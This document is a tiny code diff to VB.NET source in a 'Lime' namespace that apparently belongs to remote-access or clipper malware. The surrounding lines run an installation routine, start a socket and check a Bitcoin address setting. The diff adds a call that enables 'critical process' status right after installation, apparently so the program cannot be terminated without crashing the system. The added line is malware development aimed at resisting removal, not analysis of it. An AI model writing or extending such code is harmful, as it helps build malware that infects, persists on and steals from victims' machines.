@@ -65,6 +65,8 @@ Namespace Lime
 
             Call C_Installation.INS()
 
+            C_CriticalProcesses.CriticalProcesses_Enable()
+
             C_Socket.T1.Start()
 
             If C_Settings.BTC_ADDR.Length > 25 Then
